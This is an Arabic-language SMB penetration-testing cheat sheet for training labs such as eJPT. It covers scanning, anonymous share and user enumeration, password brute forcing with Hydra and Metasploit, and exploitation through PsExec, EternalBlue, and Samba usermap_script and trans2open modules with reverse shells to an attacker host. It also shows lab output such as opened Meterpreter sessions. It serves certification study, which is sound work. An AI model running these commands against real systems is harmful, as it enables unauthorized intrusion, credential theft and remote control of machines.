ملاحظة عن البورت: SMB يظهر غالبًا على 445/TCP، وقد يظهر عبر NetBIOS على 139/TCP. البورتان 137/UDP و138/UDP قد يظهران مع NetBIOS. إذا لم تظهر الخدمة على البورتات المتوقعة، أكمل فحص جميع البورتات قبل استبعادها.

1. Reconnaissance

تأكد من الشبكة والهدف قبل الدخول في SMB enumeration.

معرفة عنوانك والواجهة KALI TERMINAL
ip a ifconfig
اختبار الوصول للهدف KALI TERMINAL
ping -c 4 [TARGET]
عدم الرد على ICMP لا يعني أن الجهاز غير موجود؛ انتقل للفحص بـ Nmap واستخدم -Pn عند الحاجة.
اكتشاف الأجهزة عند الحاجة KALI TERMINAL
nmap -sn [SUBNET]
معرفة IP الخاص فيك والتأكد من وصول الهدف KALI TERMINAL
ip a ping -c 4 [TARGET]

2. Port Scanning

تحقق من SMB وNetBIOS ثم حدد الإصدار والبروتوكولات المدعومة.

فحص 139 و445 مع Service Detection KALI TERMINAL
nmap -p139,445 -sV [TARGET]
139/tcp open netbios-ssn 445/tcp open microsoft-ds
فحص NetBIOS UDP KALI TERMINAL
nmap -sU --top-ports 25 [TARGET]
راقب 137/UDP و138/UDP إذا كان NetBIOS مستخدمًا.
فحص شامل إذا لم تظهر الخدمة KALI TERMINAL
nmap -p- -sV [TARGET]
فحص شامل للبورتات المرتبطة KALI TERMINAL
nmap -sS -sV [TARGET]
✓ نتيجة فعلية من لاب PSexec: 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server
لاحظ ظهور 3389 (RDP) مع SMB — شائع جدًا بأجهزة ويندوز، خزّنه كهدف ثاني محتمل

3. Enumeration

ابدأ بدون Credentials، ثم أعد الفحص بالبيانات التي تكتشفها.

Version / Protocol / OS

SMB protocols وOS discovery KALI TERMINAL
nmap -p139,445 --script smb-protocols,smb-security-mode,smb-os-discovery [TARGET]
وجود SMBv1 مهم لأنه يغيّر مسار تقييم الثغرات، لكنه ليس دليلًا وحده على قابلية الاستغلال.
تحديد SMB عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smb/smb_version set RHOSTS [TARGET] run
NetBIOS name lookup KALI TERMINAL
nmblookup -A [TARGET]

Anonymous / Shares

عرض المشاركات بدون كلمة مرور KALI TERMINAL
smbclient -L [TARGET] -N
الدخول إلى Share مجهول SMBCLIENT
smbclient //[TARGET]/[SHARE] -N smb> ls smb> get [FILE]
Enumeration شامل عبر enum4linux KALI TERMINAL
enum4linux -o [TARGET] enum4linux -U [TARGET] enum4linux -S [TARGET] enum4linux -G [TARGET]

Users / RPC

اختبار Null Session عبر RPC KALI TERMINAL
rpcclient -U "" -N [TARGET]
إذا فتح prompt بدون خطأ، جرّب أوامر RPC التالية.
معلومات النظام والمستخدمين والمجموعات RPCCLIENT
rpcclient $> srvinfo rpcclient $> enumdomusers rpcclient $> enumdomgroups rpcclient $> lookupnames [USERNAME]

Nmap NSE + SMBMap

Enumeration عبر Nmap scripts KALI TERMINAL
nmap -p445 --script smb-enum-users,smb-enum-shares [TARGET]
فحص الصلاحيات على Shares KALI TERMINAL
smbmap -H [TARGET] -u guest -p "" -d .
ركز على READ / WRITE؛ المشاركة القابلة للكتابة قد تغيّر مسار اللاب بالكامل.
Enumeration ببيانات صحيحة KALI TERMINAL
smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] -L smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] -r 'C$'
Metasploit users / shares MSFCONSOLE
use auxiliary/scanner/smb/smb_enumusers set RHOSTS [TARGET] run use auxiliary/scanner/smb/smb_enumshares set RHOSTS [TARGET] run
عرض قائمة الـShares — Anonymous KALI TERMINAL
smbclient -L [TARGET] -U ""
لو طلب باسورد، جرب Enter فاضي أولًا — أحيانًا Guest/Anonymous مفعّل
الدخول لـShare محدد KALI TERMINAL
smbclient //[TARGET]/[SHARE] -U ""
smb: \> = نجح الدخول. NT_STATUS_ACCESS_DENIED = الاتصال نجح لكن الـShare محمي — احتفظ باسم الـShare وجرّبه لاحقًا ببيانات دخول
قائمة الـNamed Pipes الداخلية MSFCONSOLE
use auxiliary/scanner/smb/pipe_auditor set SMBUser [USER] set SMBPass [PASS] set RHOSTS [TARGET] run
✓ مثال فعلي من لاب: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc
استخراج SID لمستخدمي Unix عبر RID Cycling KALI TERMINAL
enum4linux -r -u "[USER]" -p "[PASS]" [TARGET]
يكشف قائمة كاملة بأسماء المستخدمين على النظام حتى لو Guest access محدود
تعداد يدوي عبر rpcclient KALI TERMINAL
rpcclient -U "" [TARGET] rpcclient $> enumdomusers

4. Credential Testing

اختبر الحسابات التي اكتشفتها، ثم أعد Enumeration بالـCredentials الناجحة.

Password testing عبر Hydra KALI TERMINAL
hydra -l [USERNAME] -P [WORDLIST] [TARGET] smb
Password testing عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smb/smb_login set RHOSTS [TARGET] set SMBUser [USERNAME] set PASS_FILE [WORDLIST] run
تأكيد الـCredentials يدويًا KALI TERMINAL
smbclient -L [TARGET] -U [USERNAME]
بعد أي Login ناجح، ارجع مباشرة إلى Enumeration لأن المستخدم الموثق قد يرى Shares وUsers لا تظهر للـGuest.
بروت فورس مستخدم واحد بقائمة كلمات مرور عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smb/smb_login set SMBUser [USER] set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt set RHOSTS [TARGET] exploit
✓ مثال فعلي: [USERNAME]:[PASSWORD] (باسورد صحيح طلع من قائمة unix_passwords.txt)
بروت فورس شامل (يوزرات + باسوردات) عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smb/smb_login set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt set RHOSTS [TARGET] set VERBOSE false exploit
✓ نتيجة فعلية — 4 حسابات صحيحة دفعة وحدة: [USER1]:[PASSWORD1] [USER2]:[PASSWORD2] [USER3]:[PASSWORD3] [USER4]:[PASSWORD4]
لاحظ رسالة CreateSession set to true — تقدر تفتح جلسة SMB تفاعلية مباشرة من نفس الوحدة
بروت فورس عبر Hydra بقائمة أكبر (rockyou) KALI TERMINAL
gzip -d /usr/share/wordlists/rockyou.txt.gz hydra -l [USER] -P /usr/share/wordlists/rockyou.txt [TARGET] smb
استخدم rockyou لو قوائم Metasploit الصغيرة ما زبطت — أبطأ بس تغطية أوسع
التحقق من صلاحيات حساب مكتشف على كل الـShares KALI TERMINAL
smbmap -H [TARGET] -u [USER] -p [PASS]
✓ يعرض كل Share مع صلاحيته: READ ONLY / READ, WRITE / NO ACCESS

5. Exploitation

اختر المسار بناءً على الإصدار، النظام، والصلاحيات المكتشفة.

تحذير: تأكد من الإصدار والنظام والـpreconditions قبل أي exploit. وجود 445 مفتوح أو SMBv1 وحده لا يثبت أن الهدف vulnerable.

Windows — Authenticated PsExec WINDOWS

Remote execution عبر Impacket PsExec KALI TERMINAL
psexec.py [USERNAME]@[TARGET]
يحتاج Credentials وصلاحيات مناسبة على الهدف.
PsExec عبر Metasploit MSFCONSOLE
use exploit/windows/smb/psexec set RHOSTS [TARGET] set SMBUser [USERNAME] set SMBPass [PASSWORD] run

Windows — MS17-010 WINDOWS

فحص MS17-010 أولًا KALI TERMINAL
nmap -p445 --script smb-vuln-ms17-010 [TARGET]
فحص MS17-010 عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS [TARGET] run
EternalBlue عند تطابق الهدف MSFCONSOLE
use exploit/windows/smb/ms17_010_eternalblue set RHOSTS [TARGET] set LHOST [ATTACKER_IP] run

Linux / Samba LINUX

البحث عن exploit مطابق للإصدار KALI TERMINAL
searchsploit samba [VERSION]
Samba username map script عند تطابق الإصدار MSFCONSOLE
use exploit/multi/samba/usermap_script set RHOSTS [TARGET] set LHOST [ATTACKER_IP] run
Known Pipe Name عند تطابق Samba المستهدف MSFCONSOLE
use exploit/linux/samba/is_known_pipename set RHOSTS [TARGET] check
نفّذ الاستغلال فقط إذا كان check والإصدار يدعمان المسار.
جلسة SMB تفاعلية كاملة KALI TERMINAL
smbclient //[TARGET]/[SHARE] -U [USER] # كلمة المرور عند الطلب smb: \> ls smb: \> cd [DIR] smb: \> get [FILE]
✓ مثال فعلي: get flag.tar.gz ثم tar -xf flag.tar.gz && cat flag
فحص الثغرة ثم الاستغلال MSFCONSOLE
use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS [TARGET] run use exploit/windows/smb/ms17_010_eternalblue set RHOSTS [TARGET] set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST [ATTACKER_IP] exploit
يعمل على أنظمة ويندوز غير محدّثة (بالذات Win7/Server 2008 R2) — يمنحك Meterpreter مباشرة بصلاحية SYSTEM غالبًا
استغلال Samba القديمة MSFCONSOLE
search trans2open use exploit/linux/samba/trans2open set RHOST [TARGET] set PAYLOAD linux/x86/shell_reverse_tcp set LHOST [ATTACKER_IP] exploit
تنفيذ أوامر / الحصول على شل عبر بيانات Admin MSFCONSOLE
msfconsole -q use exploit/windows/smb/psexec set RHOSTS [TARGET] set SMBUser Administrator set SMBPass [PASS] exploit
✓ نتيجة فعلية من لاب PSexec: [*] Started reverse TCP handler [*] Authenticating to the server as 'Administrator'... [*] Meterpreter session 1 opened
لازم بيانات دخول صحيحة بصلاحية إدارية (Local Admin) — هذا مسار "Lateral Movement" أساسي بـEJPT
البحث عن الـFlag بعد الجلسة METERPRETER
shell cd / dir type flag.txt
✓ مثال فعلي: [FLAG]

6. Post-Exploitation

خطوات فورية بعد الوصول فقط؛ التفاصيل العامة لها مراجع منفصلة.

تأكيد الهوية والسياق VICTIM SHELL
whoami
Windows — معلومات الشبكة الأساسية WINDOWS CMD
whoami ipconfig
Linux — تأكيد المستخدم والصلاحيات VICTIM SHELL
whoami id
استخدام SMB نفسه لنقل ملف عند وجود Write KALI TERMINAL
smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --upload '[FILE]' '[SHARE]\[FILE]' smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --download '[SHARE]\[FILE]'
بعد تأكيد الوصول، انتقل لمرجع Post-Exploitation بدل تكرار Credential Dumping أو Pivoting أو Meterpreter هنا.
